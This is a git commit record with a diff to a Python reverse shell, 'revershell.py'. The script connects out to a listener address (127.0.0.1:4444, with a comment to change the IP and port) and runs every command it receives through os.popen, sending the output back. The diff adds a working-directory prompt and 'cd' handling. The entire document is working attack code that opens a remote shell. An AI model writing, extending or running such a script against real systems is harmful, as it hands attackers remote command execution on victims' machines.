1082818e931eb62c12926d753a7772519a37e390
Saiprakash J <jsprakash632@gmail.com>
2024-11-23 02:13:44 +0530

    Update revershell.py

--- revershell.py
+++ revershell.py
@@ -6,8 +6,16 @@ new_request.connect(('127.0.0.1', 4444))  #change ip and port
 new_request.send("connection made ... \n ".encode())
 
 while True:
-    new_request.send(">>".encode())
-    cmd = new_request.recv(1000).decode()
+    new_request.send(f"{os.getcwd()} >>> ".encode())
+    cmd = new_request.recv(1024).decode()
+
+    if 'cd' in cmd:
+        try:
+            os.chdir(cmd[3:].strip())
+            command = os.popen(cmd).read()
+            new_request.send(command.encode())
+        except FileNotFoundError as e:
+            new_request.send("\n Directory Not Found \n ".encode())
+
     command = os.popen(cmd).read()
     new_request.send(command.encode())
-
